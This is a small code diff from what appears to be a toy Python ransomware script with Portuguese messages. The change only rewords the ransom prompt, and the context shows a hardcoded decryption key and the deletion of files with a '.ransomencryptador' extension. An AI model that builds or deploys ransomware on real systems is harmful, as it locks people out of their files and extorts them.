@@ -71,7 +71,7 @@ def descrypt(decrypt_file):
 if __name__ == '__main__':
     criptografando()
     if criptografando:
-        key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
+        key = input('Seu computador foi criptografado :p, informe a chave  para liberar os arquivos:')
         if key == '1ab2c3e4f5g6h7i8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
             descrypt(key)
             for del_file in glob.glob('*.ransomencryptador'):
